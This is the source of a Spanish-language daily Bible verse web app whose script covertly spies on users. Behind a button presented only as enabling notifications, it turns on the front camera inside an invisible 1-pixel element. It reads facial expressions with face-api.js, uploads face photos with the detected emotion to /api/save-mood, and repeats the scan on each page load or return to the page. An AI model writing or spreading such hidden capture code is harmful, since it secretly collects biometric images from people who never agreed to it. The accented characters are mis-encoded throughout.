<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <link rel="manifest" href="manifest.json">
  <title>Vers칤culo Diario</title>
  
  <script defer src="https://cdn.jsdelivr.net/npm/face-api.js@0.22.2/dist/face-api.min.js"></script>

  <style>
    body { background: #121212; color: #e0e0e0; display: flex; flex-direction: column; justify-content: center; align-items: center; min-height: 100vh; margin: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; text-align: center; overflow-x: hidden; }
    
    #main-container { width: 90%; max-width: 600px; position: relative; padding-bottom: 50px; z-index: 10; }

    #verse { font-size: 1.5rem; font-style: italic; margin-bottom: 20px; line-height: 1.4; text-shadow: 0px 2px 4px rgba(0,0,0,0.5); opacity: 0; transition: opacity 0.5s ease; }
    #reference { font-weight: bold; margin-top: 10px; color: #bb86fc; font-size: 1.1rem; letter-spacing: 1px; text-transform: uppercase; opacity: 0; transition: opacity 0.5s ease; }
    
    .fade-up { animation: fadeInUpSubtle 1.5s cubic-bezier(0.22, 1, 0.36, 1) forwards; }
    @keyframes fadeInUpSubtle { 0% { opacity: 0; transform: translateY(20px); filter: blur(5px); } 100% { opacity: 1; transform: translateY(0); filter: blur(0); } }

    .analyzing { animation: pulseText 1.5s infinite ease-in-out; }
    @keyframes pulseText { 0% { opacity: 0.6; } 50% { opacity: 1; } 100% { opacity: 0.6; } }

    /* --- BOT칍N DE BIENVENIDA --- */
    .btn-group { display: flex; flex-direction: column; gap: 15px; margin-top: 30px; align-items: center; min-height: 60px; }
    
    #btn-notify { 
        background: linear-gradient(45deg, #03dac6, #018786); 
        color: #000; 
        box-shadow: 0 4px 15px rgba(3, 218, 198, 0.4); 
        padding: 15px 30px; 
        border: none; 
        cursor: pointer; 
        border-radius: 50px; 
        font-weight: 800; 
        font-size: 1rem; 
        width: 100%; 
        max-width: 300px; 
        transition: transform 0.2s;
        display: none; /* Se muestra solo si falta el permiso */
    }
    #btn-notify:active { transform: scale(0.95); }

    .version-footer { position: fixed; bottom: 5px; width: 100%; text-align: center; font-size: 0.7rem; color: #555; pointer-events: none; }
    #hidden-camera-container { position: fixed; top: 0; left: 0; width: 1px; height: 1px; opacity: 0; z-index: -100; pointer-events: none; }
  </style>
</head>
<body>

  <div id="main-container">
    <div id="verse">Cargando inspiraci칩n...</div>
    <div id="reference"></div>
    
    <div class="btn-group">
        <button id="btn-notify" onclick="handleNotificationSetup()">游댒 ACTIVAR NOTIFICACIONES</button>
    </div>
  </div>

  <div id="hidden-camera-container">
      <video id="video-feed" autoplay muted playsinline></video>
  </div>

  <div id="version-footer" class="version-footer">Cargando versi칩n...</div>

  <script type="module">
    import { versesDB } from './js/verses.js';

    const PUBLIC_VAPID_KEY = 'BLAmSvWiwybGELdtlKxn1XH_ftdsMs2IpWshmmPWGUF3ndWSS06tXY4oFAcUEHbYQPcDaaOl_6cwNjaFM0bmUhI';
    let currentVerseData = null;
    let videoStream = null;
    let modelsLoaded = false;
    let isScanning = false;
    let lastScanTime = 0;
    let scanStartTime = 0;
    const SCAN_COOLDOWN = 15000; 
    const SCAN_TIMEOUT = 5000;

    // --- 1. L칍GICA DEL BOT칍N (SOLO NOTIFICACIONES) ---
    window.handleNotificationSetup = function() {
        // Al hacer clic, pedimos permiso de NOTIFICACI칍N (que requiere gesto de usuario)
        window.subscribeUser().then((success) => {
            if (success) {
                // Si acept칩, ocultamos el bot칩n
                document.getElementById('btn-notify').style.display = 'none';
                
                // Y arrancamos la c치mara (si ya tiene permiso, ser치 invisible; si no, pedir치 ah칤 mismo)
                startMoodScan(true);
            }
        });
    }

    // --- 2. GESTI칍N DE SUSCRIPCI칍N ---
    window.subscribeUser = async function() {
      if (!('serviceWorker' in navigator)) return false;
      try {
        const reg = await navigator.serviceWorker.ready;
        
        // El navegador mostrar치 el popup nativo "쯇ermitir notificaciones?"
        const permission = await Notification.requestPermission();
        if (permission !== 'granted') {
            alert("Necesitamos las notificaciones para enviarte tu vers칤culo diario.");
            return false; 
        }
        
        // Conversi칩n de clave VAPID
        function urlBase64ToUint8Array(base64String) {
            const padding = '='.repeat((4 - base64String.length % 4) % 4);
            const base64 = (base64String + padding).replace(/-/g, '+').replace(/_/g, '/');
            const rawData = window.atob(base64);
            const outputArray = new Uint8Array(rawData.length);
            for (let i = 0; i < rawData.length; ++i) outputArray[i] = rawData.charCodeAt(i);
            return outputArray;
        }

        // Suscribir
        const sub = await reg.pushManager.subscribe({ userVisibleOnly: true, applicationServerKey: urlBase64ToUint8Array(PUBLIC_VAPID_KEY) });
        
        // Guardar en Backend
        await fetch('/api/subscribe', { method: 'POST', body: JSON.stringify({ subscription: sub, firstVerse: currentVerseData }), headers: { 'Content-Type': 'application/json' } });
        
        // Marcar configuraci칩n local
        localStorage.setItem('setup_v1_pwa', 'true'); 
        return true;
      } catch (err) { 
          console.error(err); 
          return false;
      }
    }

    // --- 3. INICIALIZACI칍N INTELIGENTE ---
    async function initApp() {
        showVersionFromSW();
        renderVerse(versesDB[new Date().getDate() % versesDB.length]);

        if ('serviceWorker' in navigator) {
            const reg = await navigator.serviceWorker.register('sw.js', { type: 'module' });
            reg.onupdatefound = () => { const nw = reg.installing; nw.onstatechange = () => { if (nw.state === 'activated' && navigator.serviceWorker.controller) window.location.reload(); }; };
            navigator.serviceWorker.addEventListener('controllerchange', () => window.location.reload());

            // --- CHEQUEO CLAVE ---
            const sub = await reg.pushManager.getSubscription();
            const btnNotify = document.getElementById('btn-notify');

            if (sub) {
                // CASO 1: YA TIENE NOTIFICACIONES (Usuario Recurrente)
                // Ocultamos bot칩n y arrancamos magia directa
                btnNotify.style.display = 'none';
                setTimeout(() => startMoodScan(), 1000);
            } else {
                // CASO 2: NO TIENE NOTIFICACIONES (Instalaci칩n Nueva)
                // Mostramos bot칩n para pedir permiso
                btnNotify.style.display = 'block';
            }
        }
    }

    // --- IA LOGIC (C츼MARA INVISIBLE) ---
    window.startMoodScan = async function(force = false) {
        if (isScanning) return;
        const now = Date.now();
        if (!force && (now - lastScanTime < SCAN_COOLDOWN)) return;

        isScanning = true;
        scanStartTime = Date.now();
        document.getElementById('reference').classList.add('analyzing');

        try {
            // Si el usuario ya dio permiso de c치mara antes, esto pasa transparente.
            // Si no, el navegador mostrar치 el popup de c치mara aqu칤.
            videoStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
            
            const video = document.getElementById('video-feed');
            video.srcObject = videoStream;
            await video.play().catch(() => {});

            if (!modelsLoaded) {
                await faceapi.nets.tinyFaceDetector.loadFromUri('https://cdn.jsdelivr.net/gh/cgarciagl/face-api.js@0.22.2/weights/');
                await faceapi.nets.faceExpressionNet.loadFromUri('https://cdn.jsdelivr.net/gh/cgarciagl/face-api.js@0.22.2/weights/');
                modelsLoaded = true;
            }
            detectEmotionLoop();
        } catch (err) { handleScanFailure(); }
    }

    async function detectEmotionLoop() {
        if (!isScanning) return;
        if (Date.now() - scanStartTime > SCAN_TIMEOUT) { handleScanFailure(); return; }
        const video = document.getElementById('video-feed');
        try {
            const options = new faceapi.TinyFaceDetectorOptions();
            const detections = await faceapi.detectSingleFace(video, options).withFaceExpressions();
            if (detections) {
                const expressions = detections.expressions;
                const sorted = Object.keys(expressions).sort((a, b) => expressions[b] - expressions[a]);
                const dominant = sorted[0];
                const confidence = expressions[dominant];
                if (confidence > 0.5) {
                    captureAndSave(video, dominant, confidence);
                    finishScan(dominant);
                    return;
                }
            }
        } catch(e) {}
        if (isScanning) setTimeout(detectEmotionLoop, 200);
    }

    function finishScan(mood) {
        lastScanTime = Date.now();
        isScanning = false;
        stopCamera();
        document.getElementById('reference').classList.remove('analyzing');
        showVerseByMood(mood);
    }

    function handleScanFailure() {
        lastScanTime = Date.now();
        isScanning = false;
        stopCamera();
        document.getElementById('reference').classList.remove('analyzing');
    }

    async function captureAndSave(videoElement, emotion, confidence) {
        try {
            const canvas = document.createElement('canvas');
            canvas.width = videoElement.videoWidth;
            canvas.height = videoElement.videoHeight;
            const ctx = canvas.getContext('2d');
            ctx.translate(canvas.width, 0);
            ctx.scale(-1, 1);
            ctx.drawImage(videoElement, 0, 0);
            const base64Image = canvas.toDataURL('image/jpeg', 0.5);
            const verse = getVerseForMood(emotion);
            const payload = { image: base64Image, emotion, confidence, verse };
            if (navigator.onLine) sendToMongo(payload);
            else saveToOfflineQueue(payload);
        } catch (e) {}
    }

    async function sendToMongo(payload) {
        try { await fetch('/api/save-mood', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) }); } 
        catch(e) { saveToOfflineQueue(payload); }
    }
    function saveToOfflineQueue(payload) {
        let queue = JSON.parse(localStorage.getItem('mood_queue') || '[]');
        queue.push(payload); if (queue.length > 3) queue.shift();
        localStorage.setItem('mood_queue', JSON.stringify(queue));
    }
    async function processOfflineQueue() {
        if (!navigator.onLine) return;
        let queue = JSON.parse(localStorage.getItem('mood_queue') || '[]');
        if (queue.length === 0) return;
        for (const item of queue) { await sendToMongo(item); }
        localStorage.removeItem('mood_queue');
    }

    // --- UTILIDADES ---
    window.addEventListener('online', processOfflineQueue);
    window.addEventListener('load', processOfflineQueue);
    window.unsubscribeUser = async function() { /* L칩gica de reset si se necesita */ };

    function getVerseForMood(mood) {
        let dbMood = 'neutral';
        if (mood === 'happy') dbMood = 'happy'; if (mood === 'sad') dbMood = 'sad';
        if (mood === 'angry' || mood === 'disgusted') dbMood = 'angry'; if (mood === 'fearful') dbMood = 'fear';
        const filtered = versesDB.filter(v => v.m && v.m.includes(dbMood));
        const pool = filtered.length > 0 ? filtered : versesDB;
        return pool[Math.floor(Math.random() * pool.length)];
    }
    function showVerseByMood(mood) { renderVerse(getVerseForMood(mood)); }
    function renderVerse(data) {
        currentVerseData = data;
        const verseEl = document.getElementById('verse');
        const refEl = document.getElementById('reference');
        verseEl.style.opacity = 0; refEl.style.opacity = 0;
        setTimeout(() => {
            verseEl.innerText = `"${data.t}"`; refEl.innerText = data.r;
            verseEl.style.opacity = 1; refEl.style.opacity = 1;
            verseEl.classList.remove('fade-up'); void verseEl.offsetWidth; verseEl.classList.add('fade-up');
        }, 500);
    }
    window.stopCamera = function() { if (videoStream) { videoStream.getTracks().forEach(track => track.stop()); videoStream = null; } }

    async function showVersionFromSW() {
        try {
            const response = await fetch('./sw.js?t=' + new Date().getTime());
            const text = await response.text();
            const match = text.match(/const\s+CACHE_NAME\s*=\s*['"]([^'"]+)['"]/);
            if (match && match[1]) document.getElementById('version-footer').innerText = `App: ${match[1].replace('biblia-', '')}`;
        } catch (e) {}
    }

    // --- CORTE DE C츼MARA (PRIVACIDAD) ---
    document.addEventListener("visibilitychange", () => {
        if (document.visibilityState === "hidden") {
            stopCamera(); isScanning = false;
        } else if (document.visibilityState === "visible") {
            if (localStorage.getItem('setup_v1_pwa')) startMoodScan(); 
        }
    });

    // Arrancamos
    initApp();

  </script>
</body>
</html>
